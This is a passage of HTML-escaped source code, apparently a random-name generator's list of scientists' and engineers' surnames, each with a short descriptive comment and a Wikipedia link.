class="line"></span><br><span class="line">		&#x2F;&#x2F; Archimedes was a physicist, engineer and mathematician who invented too many things to list them here. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Archimedes</span><br><span class="line">		&quot;archimedes&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Maria Ardinghelli - Italian translator, mathematician and physicist - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Maria\_Ardinghelli</span><br><span class="line">		&quot;ardinghelli&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Aryabhata - Ancient Indian mathematician-astronomer during 476-550 CE https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Aryabhata</span><br><span class="line">		&quot;aryabhata&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Wanda Austin - Wanda Austin is the President and CEO of The Aerospace Corporation, a leading architect for the US security space programs. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Wanda\_Austin</span><br><span class="line">		&quot;austin&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Charles Babbage invented the concept of a programmable computer. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Charles\_Babbage.</span><br><span class="line">		&quot;babbage&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Stefan Banach - Polish mathematician, was one of the founders of modern functional analysis. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Stefan\_Banach</span><br><span class="line">		&quot;banach&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; John Bardeen co-invented the transistor - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;John\_Bardeen</span><br><span class="line">		&quot;bardeen&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jean Bartik, born Betty Jean Jennings, was one of the original programmers for the ENIAC computer. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jean\_Bartik</span><br><span class="line">		&quot;bartik&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Laura Bassi, the world&#39;s first female professor https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Laura\_Bassi</span><br><span class="line">		&quot;bassi&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Alexander Graham Bell - an eminent Scottish-born scientist, inventor, engineer and innovator who is credited with inventing the first practical telephone - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Alexander\_Graham\_Bell</span><br><span class="line">		&quot;bell&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Homi J Bhabha - was an Indian nuclear physicist, founding director, and professor of physics at the Tata Institute of Fundamental Research. Colloquially known as &quot;father of Indian nuclear programme&quot;- https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Homi\_J.\_Bhabha</span><br><span class="line">		&quot;bhabha&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Bhaskara II - Ancient Indian mathematician-astronomer whose work on calculus predates Newton and Leibniz by over half a millennium - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Bh%C4%81skara\_II#Calculus</span><br><span class="line">		&quot;bhaskara&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Elizabeth Blackwell - American doctor and first American woman to receive a medical degree - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Elizabeth\_Blackwell</span><br><span class="line">		&quot;blackwell&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Niels Bohr is the father of quantum theory. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Niels\_Bohr.</span><br><span class="line">		&quot;bohr&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Kathleen Booth, she&#39;s credited with writing the first assembly language. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Kathleen\_Booth</span><br><span class="line">		&quot;booth&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Anita Borg - Anita Borg was the founding director of the Institute for Women and Technology (IWT). https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Anita\_Borg</span><br><span class="line">		&quot;borg&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Satyendra Nath Bose - He provided the foundation for Bose–Einstein statistics and the theory of the Bose–Einstein condensate. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Satyendra\_Nath\_Bose</span><br><span class="line">		&quot;bose&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Evelyn Boyd Granville - She was one of the first African-American woman to receive a Ph.D. in mathematics; she earned it in 1949 from Yale University. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Evelyn\_Boyd\_Granville</span><br><span class="line">		&quot;boyd&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Brahmagupta - Ancient Indian mathematician during 598-670 CE who gave rules to compute with zero - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Brahmagupta#Zero</span><br><span class="line">		&quot;brahmagupta&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Walter Houser Brattain co-invented the transistor - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Walter\_Houser\_Brattain</span><br><span class="line">		&quot;brattain&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Emmett Brown invented time travel. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Emmett\_Brown (thanks Brian Goff)</span><br><span class="line">		&quot;brown&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Rachel Carson - American marine biologist and conservationist, her book Silent Spring and other writings are credited with advancing the global environmental movement. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Rachel\_Carson</span><br><span class="line">		&quot;carson&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Subrahmanyan Chandrasekhar - Astrophysicist known for his mathematical theory on different stages and evolution in structures of the stars. He has won nobel prize for physics - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Subrahmanyan\_Chandrasekhar</span><br><span class="line">		&quot;chandrasekhar&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F;Claude Shannon - The father of information theory and founder of digital circuit design theory. (https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Claude\_Shannon)</span><br><span class="line">		&quot;shannon&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jane Colden - American botanist widely considered the first female American botanist - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jane\_Colden</span><br><span class="line">		&quot;colden&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Gerty Theresa Cori - American biochemist who became the third woman—and first American woman—to win a Nobel Prize in science, and the first woman to be awarded the Nobel Prize in Physiology or Medicine. Cori was born in Prague. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Gerty\_Cori</span><br><span class="line">		&quot;cori&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Seymour Roger Cray was an American electrical engineer and supercomputer architect who designed a series of computers that were the fastest in the world for decades. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Seymour\_Cray</span><br><span class="line">		&quot;cray&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; This entry reflects a husband and wife team who worked together:</span><br><span class="line">		&#x2F;&#x2F; Joan Curran was a Welsh scientist who developed radar and invented chaff, a radar countermeasure. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Joan\_Curran</span><br><span class="line">		&#x2F;&#x2F; Samuel Curran was an Irish physicist who worked alongside his wife during WWII and invented the proximity fuse. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Samuel\_Curran</span><br><span class="line">		&quot;curran&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Marie Curie discovered radioactivity. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Marie\_Curie.</span><br><span class="line">		&quot;curie&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Charles Darwin established the principles of natural evolution. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Charles\_Darwin.</span><br><span class="line">		&quot;darwin&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Leonardo Da Vinci invented too many things to list here. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Leonardo\_da\_Vinci.</span><br><span class="line">		&quot;davinci&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Edsger Wybe Dijkstra was a Dutch computer scientist and mathematical scientist. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Edsger\_W.\_Dijkstra.</span><br><span class="line">		&quot;dijkstra&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Donna Dubinsky - played an integral role in the development of personal digital assistants (PDAs) serving as CEO of Palm, Inc. and co-founding Handspring. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Donna\_Dubinsky</span><br><span class="line">		&quot;dubinsky&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Annie Easley - She was a leading member of the team which developed software for the Centaur rocket stage and one of the first African-Americans in her field. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Annie\_Easley</span><br><span class="line">		&quot;easley&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Thomas Alva Edison, prolific inventor https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Thomas\_Edison</span><br><span class="line">		&quot;edison&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Albert Einstein invented the general theory of relativity. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Albert\_Einstein</span><br><span class="line">		&quot;einstein&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Gertrude Elion - American biochemist, pharmacologist and the 1988 recipient of the Nobel Prize in Medicine - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Gertrude\_Elion</span><br><span class="line">		&quot;elion&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Douglas Engelbart gave the mother of all demos: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Douglas\_Engelbart</span><br><span class="line">		&quot;engelbart&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Euclid invented geometry. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Euclid</span><br><span class="line">		&quot;euclid&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Leonhard Euler invented large parts of modern mathematics. https:&#x2F;&#x2F;de.wikipedia.org&#x2F;wiki&#x2F;Leonhard\_Euler</span><br><span class="line">		&quot;euler&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Pierre de Fermat pioneered several aspects of modern mathematics. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Pierre\_de\_Fermat</span><br><span class="line">		&quot;fermat&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Enrico Fermi invented the first nuclear reactor. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Enrico\_Fermi.</span><br><span class="line">		&quot;fermi&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Richard Feynman was a key contributor to quantum mechanics and particle physics. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Richard\_Feynman</span><br><span class="line">		&quot;feynman&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Benjamin Franklin is famous for his experiments in electricity and the invention of the lightning rod.</span><br><span class="line">		&quot;franklin&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Galileo was a founding father of modern astronomy, and faced politics and obscurantism to establish scientific truth.  https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Galileo\_Galilei</span><br><span class="line">		&quot;galileo&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; William Henry &quot;Bill&quot; Gates III is an American business magnate, philanthropist, investor, computer programmer, and inventor. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Bill\_Gates</span><br><span class="line">		&quot;gates&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Adele Goldberg, was one of the designers and developers of the Smalltalk language. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Adele\_Goldberg\_(computer\_scientist)</span><br><span class="line">		&quot;goldberg&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Adele Goldstine, born Adele Katz, wrote the complete technical description for the first electronic digital computer, ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Adele\_Goldstine</span><br><span class="line">		&quot;goldstine&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Shafi Goldwasser is a computer scientist known for creating theoretical foundations of modern cryptography. Winner of 2012 ACM Turing Award. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Shafi\_Goldwasser</span><br><span class="line">		&quot;goldwasser&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; James Golick, all around gangster.</span><br><span class="line">		&quot;golick&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jane Goodall - British primatologist, ethologist, and anthropologist who is considered to be the world&#39;s foremost expert on chimpanzees - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jane\_Goodall</span><br><span class="line">		&quot;goodall&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Margaret Hamilton - Director of the Software Engineering Division of the MIT Instrumentation Laboratory, which developed on-board flight software for the Apollo space program. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Margaret\_Hamilton\_(scientist)</span><br><span class="line">		&quot;hamilton&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Stephen Hawking pioneered the field of cosmology by combining general relativity and quantum mechanics. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Stephen\_Hawking</span><br><span class="line">		&quot;hawking&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Werner Heisenberg was a founding father of quantum mechanics. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Werner\_Heisenberg</span><br><span class="line">		&quot;heisenberg&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jaroslav Heyrovský was the inventor of the polarographic method, father of the electroanalytical method, and recipient of the Nobel Prize in 1959. His main field of work was polarography. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jaroslav\_Heyrovsk%C3%BD</span><br><span class="line">		&quot;heyrovsky&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Dorothy Hodgkin was a British biochemist, credited with the development of protein crystallography. She was awarded the Nobel Prize in Chemistry in 1964. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Dorothy\_Hodgkin</span><br><span class="line">		&quot;hodgkin&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Erna Schneider Hoover revolutionized modern communication by inventing a computerized telephone switching method. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Erna\_Schneider\_Hoover</span><br><span class="line">		&quot;hoover&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Grace Hopper developed the first compiler for a computer programming language and  is credited with popularizing the term &quot;debugging&quot; for fixing computer glitches. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Grace\_Hopper</span><br><span class="line">		&quot;hopper&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Frances Hugle, she was an American scientist, engineer, and inventor who contributed to the understanding of semiconductors, integrated circuitry, and the unique electrical principles of microscopic materials. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Frances\_Hugle</span><br><span class="line">		&quot;hugle&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Hypatia - Greek Alexandrine Neoplatonist philosopher in Egypt who was one of the earliest mothers of mathematics - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Hypatia</span><br><span class="line">		&quot;hypatia&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Yeong-Sil Jang was a Korean scientist and astronomer during the Joseon Dynasty; he invented the first metal printing press and water gauge. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jang\_Yeong-sil</span><br><span class="line">		&quot;jang&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Betty Jennings - one of the original programmers of the ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;ENIAC - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jean\_Bartik</span><br><span class="line">		&quot;jennings&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Mary Lou Jepsen, was the founder and chief technology officer of One Laptop Per Child (OLPC), and the founder of Pixel Qi. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Mary\_Lou\_Jepsen</span><br><span class="line">		&quot;jepsen&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Irène Joliot-Curie - French scientist who was awarded the Nobel Prize for Chemistry in 1935. Daughter of Marie and Pierre Curie. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ir%C3%A8ne\_Joliot-Curie</span><br><span class="line">		&quot;joliot&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Karen Spärck Jones came up with the concept of inverse document frequency, which is used in most search engines today. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Karen\_Sp%C3%A4rck\_Jones</span><br><span class="line">		&quot;jones&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; A. P. J. Abdul Kalam - is an Indian scientist aka Missile Man of India for his work on the development of ballistic missile and launch vehicle technology - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;A.\_P.\_J.\_Abdul\_Kalam</span><br><span class="line">		&quot;kalam&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Susan Kare, created the icons and many of the interface elements for the original Apple Macintosh in the 1980s, and was an original employee of NeXT, working as the Creative Director. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Susan\_Kare</span><br><span class="line">		&quot;kare&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Mary Kenneth Keller, Sister Mary Kenneth Keller became the first American woman to earn a PhD in Computer Science in 1965. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Mary\_Kenneth\_Keller</span><br><span class="line">		&quot;keller&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Har Gobind Khorana - Indian-American biochemist who shared the 1968 Nobel Prize for Physiology - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Har\_Gobind\_Khorana</span><br><span class="line">		&quot;khorana&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jack Kilby invented silicone integrated circuits and gave Silicon Valley its name. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jack\_Kilby</span><br><span class="line">		&quot;kilby&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Maria Kirch - German astronomer and first woman to discover a comet - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Maria\_Margarethe\_Kirch</span><br><span class="line">		&quot;kirch&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Donald Knuth - American computer scientist, author of &quot;The Art of Computer Programming&quot; and creator of the TeX typesetting system. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Donald\_Knuth</span><br><span class="line">		&quot;knuth&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Sophie Kowalevski - Russian mathematician responsible for important original contributions to analysis, differential equations and mechanics - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sofia\_Kovalevskaya</span><br><span class="line">		&quot;kowalevski&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Marie-Jeanne de Lalande - French astronomer, mathematician and cataloguer of stars - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Marie-Jeanne\_de\_Lalande</span><br><span class="line">		&quot;lalande&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Hedy Lamarr - Actress and inventor. The principles of her work are now incorporated into modern Wi-Fi, CDMA and Bluetooth technology. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Hedy\_Lamarr</span><br><span class="line">		&quot;lamarr&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Leslie B. Lamport - American computer scientist. Lamport is best known for his seminal work in distributed systems and was the winner of the 2013 Turing Award. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Leslie\_Lamport</span><br><span class="line">		&quot;lamport&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Mary Leakey - British paleoanthropologist who discovered the first fossilized Proconsul skull - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Mary\_Leakey</span><br><span class="line">		&quot;leakey&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Henrietta Swan Leavitt - she was an American astronomer who discovered the relation between the luminosity and the period of Cepheid variable stars. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Henrietta\_Swan\_Leavitt</span><br><span class="line">		&quot;leavitt&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Ruth Lichterman - one of the original programmers of the ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;ENIAC - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ruth\_Teitelbaum</span><br><span class="line">		&quot;lichterman&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Barbara Liskov - co-developed the Liskov substitution principle. Liskov was also the winner of the Turing Prize in 2008. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Barbara\_Liskov</span><br><span class="line">		&quot;liskov&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Ada Lovelace invented the first algorithm. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ada\_Lovelace (thanks James Turnbull)</span><br><span class="line">		&quot;lovelace&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Auguste and Louis Lumière - the first filmmakers in history - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Auguste\_and\_Louis\_Lumi%C3%A8re</span><br><span class="line">		&quot;lumiere&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Mahavira - Ancient Indian mathematician during 9th century AD who discovered basic algebraic identities - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Mah%C4%81v%C4%ABra\_(mathematician)</span><br><span class="line">		&quot;mahavira&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Maria Mayer - American theoretical physicist and Nobel laureate in Physics for proposing the nuclear shell model of the atomic nucleus - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Maria\_Mayer</span><br><span class="line">		&quot;mayer&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; John McCarthy invented LISP: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;John\_McCarthy\_(computer\_scientist)</span><br><span class="line">		&quot;mccarthy&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Barbara McClintock - a distinguished American cytogeneticist, 1983 Nobel Laureate in Physiology or Medicine for discovering transposons. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Barbara\_McClintock</span><br><span class="line">		&quot;mcclintock&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Malcolm McLean invented the modern shipping container: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Malcom\_McLean</span><br><span class="line">		&quot;mclean&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Kay McNulty - one of the original programmers of the ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;ENIAC - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Kathleen\_Antonelli</span><br><span class="line">		&quot;mcnulty&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Lise Meitner - Austrian&#x2F;Swedish physicist who was involved in the discovery of nuclear fission. The element meitnerium is named after her - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Lise\_Meitner</span><br><span class="line">		&quot;meitner&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Carla Meninsky, was the game designer and programmer for Atari 2600 games Dodge &#39;Em and Warlords. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Carla\_Meninsky</span><br><span class="line">		&quot;meninsky&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Johanna Mestorf - German prehistoric archaeologist and first female museum director in Germany - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Johanna\_Mestorf</span><br><span class="line">		&quot;mestorf&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Marvin Minsky - Pioneer in Artificial Intelligence, co-founder of the MIT&#39;s AI Lab, won the Turing Award in 1969. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Marvin\_Minsky</span><br><span class="line">		&quot;minsky&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Maryam Mirzakhani - an Iranian mathematician and the first woman to win the Fields Medal. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Maryam\_Mirzakhani</span><br><span class="line">		&quot;mirzakhani&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Samuel Morse - contributed to the invention of a single-wire telegraph system based on European telegraphs and was a co-developer of the Morse code - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Samuel\_Morse</span><br><span class="line">		&quot;morse&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Ian Murdock - founder of the Debian project - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ian\_Murdock</span><br><span class="line">		&quot;murdock&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Isaac Newton invented classic mechanics and modern optics. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Isaac\_Newton</span><br><span class="line">		&quot;newton&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Florence Nightingale, more prominently known as a nurse, was also the first female member of the Royal Statistical Society and a pioneer in statistical graphics https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Florence\_Nightingale#Statistics\_and\_sanitary\_reform</span><br><span class="line">		&quot;nightingale&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Alfred Nobel - a Swedish chemist, engineer, innovator, and armaments manufacturer (inventor of dynamite) - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Alfred\_Nobel</span><br><span class="line">		&quot;nobel&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Emmy Noether, German mathematician. Noether&#39;s Theorem is named after her. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Emmy\_Noether</span><br><span class="line">		&quot;noether&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Poppy Northcutt. Poppy Northcutt was the first woman to work as part of NASA’s Mission Control. http:&#x2F;&#x2F;www.businessinsider.com&#x2F;poppy-northcutt-helped-apollo-astronauts-2014-12?op&#x3D;1</span><br><span class="line">		&quot;northcutt&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Robert Noyce invented silicone integrated circuits and gave Silicon Valley its name. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robert\_Noyce</span><br><span class="line">		&quot;noyce&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Panini - Ancient Indian linguist and grammarian from 4th century CE who worked on the world&#39;s first formal system - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;P%C4%81%E1%B9%87ini#Comparison\_with\_modern\_formal\_systems</span><br><span class="line">		&quot;panini&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Ambroise Pare invented modern surgery. 